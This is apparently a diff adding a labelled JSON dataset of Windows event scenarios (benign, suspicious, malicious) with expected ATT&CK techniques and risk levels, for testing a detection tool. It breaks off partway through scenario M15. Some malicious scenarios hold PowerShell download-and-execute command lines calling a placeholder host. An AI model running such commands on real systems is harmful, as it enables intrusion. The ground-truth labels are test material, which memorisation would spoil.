@@ -1,0 +1,1787 @@
+[
+  {
+    "scenario_id": "B01",
+    "name": "Legitimate Administrative PowerShell",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T09:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ADMIN",
+        "username": "admin",
+        "source_ip": "10.10.10.10",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -Command Get-Service",
+        "message": "Legitimate administrative PowerShell activity"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B02",
+    "name": "Legitimate Administrative PowerShell",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T09:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ADMIN",
+        "username": "admin",
+        "source_ip": "10.10.10.10",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -Command Get-Process",
+        "message": "Legitimate administrative PowerShell activity"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B03",
+    "name": "Legitimate Administrative PowerShell",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T09:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ADMIN",
+        "username": "admin",
+        "source_ip": "10.10.10.10",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -Command Get-Date",
+        "message": "Legitimate administrative PowerShell activity"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B04",
+    "name": "Legitimate Administrative PowerShell",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T09:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ADMIN",
+        "username": "admin",
+        "source_ip": "10.10.10.10",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -Command Get-ComputerInfo",
+        "message": "Legitimate administrative PowerShell activity"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B05",
+    "name": "Legitimate Administrative PowerShell",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T09:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-ADMIN",
+        "username": "admin",
+        "source_ip": "10.10.10.10",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -Command Get-ChildItem C:\\Users",
+        "message": "Legitimate administrative PowerShell activity"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B06",
+    "name": "Normal User Authentication",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T10:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-USER",
+        "username": "user6",
+        "source_ip": "10.10.10.20",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Normal successful authentication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B07",
+    "name": "Normal User Authentication",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T10:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-USER",
+        "username": "user7",
+        "source_ip": "10.10.10.20",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Normal successful authentication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B08",
+    "name": "Normal User Authentication",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T10:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-USER",
+        "username": "user8",
+        "source_ip": "10.10.10.20",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Normal successful authentication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B09",
+    "name": "Normal User Authentication",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T10:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-USER",
+        "username": "user9",
+        "source_ip": "10.10.10.20",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Normal successful authentication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B10",
+    "name": "Normal User Authentication",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T10:00:00Z",
+        "event_id": 4624,
+        "event_type": "Successful Login",
+        "source": "WS-USER",
+        "username": "user10",
+        "source_ip": "10.10.10.20",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Normal successful authentication"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B11",
+    "name": "Normal Browser Activity",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T11:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "user11",
+        "source_ip": "10.10.10.30",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser process"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B12",
+    "name": "Normal Browser Activity",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T11:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "user12",
+        "source_ip": "10.10.10.30",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser process"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B13",
+    "name": "Normal Browser Activity",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T11:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "user13",
+        "source_ip": "10.10.10.30",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser process"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B14",
+    "name": "Normal Browser Activity",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T11:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "user14",
+        "source_ip": "10.10.10.30",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser process"
+      }
+    ]
+  },
+  {
+    "scenario_id": "B15",
+    "name": "Normal Browser Activity",
+    "ground_truth": "BENIGN",
+    "expected_attack": false,
+    "expected_techniques": [],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T11:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "user15",
+        "source_ip": "10.10.10.30",
+        "destination_ip": null,
+        "process": "chrome.exe",
+        "command_line": "chrome.exe",
+        "message": "Normal browser process"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M01",
+    "name": "Malicious PowerShell Execution",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T12:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-VICTIM",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M02",
+    "name": "Malicious PowerShell Execution",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T12:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-VICTIM",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M03",
+    "name": "Malicious PowerShell Execution",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T12:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-VICTIM",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious-example.test/payload')",
+        "message": "Suspicious PowerShell execution"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M04",
+    "name": "Malicious PowerShell Execution",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T12:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-VICTIM",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -Command Invoke-WebRequest http://malicious-example.test/payload",
+        "message": "Suspicious PowerShell execution"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M05",
+    "name": "Malicious PowerShell Execution",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T12:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-VICTIM",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -WindowStyle Hidden -Command IEX $payload",
+        "message": "Suspicious PowerShell execution"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M06",
+    "name": "Brute Force Attack",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1110"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T13:00:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:01:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:03:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M07",
+    "name": "Brute Force Attack",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1110"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T13:00:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:01:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:03:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M08",
+    "name": "Brute Force Attack",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1110"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T13:00:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:01:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:03:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M09",
+    "name": "Brute Force Attack",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1110"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T13:00:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:01:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:03:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M10",
+    "name": "Brute Force Attack",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1110"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T13:00:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:01:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:02:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      },
+      {
+        "timestamp": "2026-09-09T13:03:00Z",
+        "event_id": 4625,
+        "event_type": "Failed Login",
+        "source": "SRV-DC01",
+        "username": "administrator",
+        "source_ip": "10.10.20.99",
+        "destination_ip": null,
+        "process": null,
+        "command_line": null,
+        "message": "Repeated failed authentication attempt"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S01",
+    "name": "Isolated System Discovery",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1033"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T14:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System discovery command observed"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S02",
+    "name": "Isolated System Discovery",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1033"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T14:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c ipconfig",
+        "message": "System discovery command observed"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S03",
+    "name": "Isolated System Discovery",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1033"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T14:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c systeminfo",
+        "message": "System discovery command observed"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S04",
+    "name": "Isolated System Discovery",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1033"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T14:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c tasklist",
+        "message": "System discovery command observed"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S05",
+    "name": "Isolated System Discovery",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1033"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T14:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-USER",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c net user",
+        "message": "System discovery command observed"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S06",
+    "name": "Suspicious External Communication",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1071"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T15:00:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-NET",
+        "username": "bob",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "Outbound external network connection"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S07",
+    "name": "Suspicious External Communication",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1071"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T15:00:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-NET",
+        "username": "bob",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "198.51.100.25",
+        "process": null,
+        "command_line": null,
+        "message": "Outbound external network connection"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S08",
+    "name": "Suspicious External Communication",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1071"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T15:00:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-NET",
+        "username": "bob",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "185.199.108.153",
+        "process": null,
+        "command_line": null,
+        "message": "Outbound external network connection"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S09",
+    "name": "Suspicious External Communication",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1071"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T15:00:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-NET",
+        "username": "bob",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.80",
+        "process": null,
+        "command_line": null,
+        "message": "Outbound external network connection"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S10",
+    "name": "Suspicious External Communication",
+    "ground_truth": "SUSPICIOUS",
+    "expected_attack": false,
+    "expected_techniques": [
+      "T1071"
+    ],
+    "expected_risk": "LOW",
+    "events": [
+      {
+        "timestamp": "2026-09-09T15:00:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-NET",
+        "username": "bob",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "198.51.100.80",
+        "process": null,
+        "command_line": null,
+        "message": "Outbound external network connection"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M11",
+    "name": "Malicious Discovery Activity",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1071"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T16:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T16:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System owner discovery"
+      },
+      {
+        "timestamp": "2026-09-09T16:02:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication after discovery"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M12",
+    "name": "Malicious Discovery Activity",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1071"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T16:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T16:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System owner discovery"
+      },
+      {
+        "timestamp": "2026-09-09T16:02:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication after discovery"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M13",
+    "name": "Malicious Discovery Activity",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1071"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T16:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T16:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System owner discovery"
+      },
+      {
+        "timestamp": "2026-09-09T16:02:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication after discovery"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M14",
+    "name": "Malicious Discovery Activity",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1071"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T16:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc SQBFAFgA",
+        "message": "Suspicious PowerShell execution"
+      },
+      {
+        "timestamp": "2026-09-09T16:01:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": null,
+        "process": "cmd.exe",
+        "command_line": "cmd.exe /c whoami",
+        "message": "System owner discovery"
+      },
+      {
+        "timestamp": "2026-09-09T16:02:00Z",
+        "event_id": 5156,
+        "event_type": "Network Connection",
+        "source": "WS-COMPROMISED",
+        "username": "alice",
+        "source_ip": "10.10.20.15",
+        "destination_ip": "203.0.113.50",
+        "process": null,
+        "command_line": null,
+        "message": "External communication after discovery"
+      }
+    ]
+  },
+  {
+    "scenario_id": "M15",
+    "name": "Malicious Discovery Activity",
+    "ground_truth": "MALICIOUS",
+    "expected_attack": true,
+    "expected_techniques": [
+      "T1059.001",
+      "T1033",
+      "T1071"
+    ],
+    "expected_risk": "HIGH",
+    "events": [
+      {
+        "timestamp": "2026-09-09T16:00:00Z",
+        "event_id": 4688,
+        "event_type": "Process Creation",
